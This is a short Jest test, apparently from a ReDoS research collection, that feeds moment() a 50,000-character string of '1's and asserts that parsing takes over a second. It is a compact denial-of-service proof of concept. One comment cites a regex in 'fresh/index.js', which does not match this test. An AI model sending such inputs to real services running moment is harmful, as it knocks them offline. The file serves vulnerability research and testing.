//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-moment.js


test("ReDos in moment", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const moment = require('moment');

    let str = genstr(50000, '1') + ""; //progblematic regex: / *, */, in fresh/index.js

    let t = measureTime(function () {
        moment(str, "MMM");
    });

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});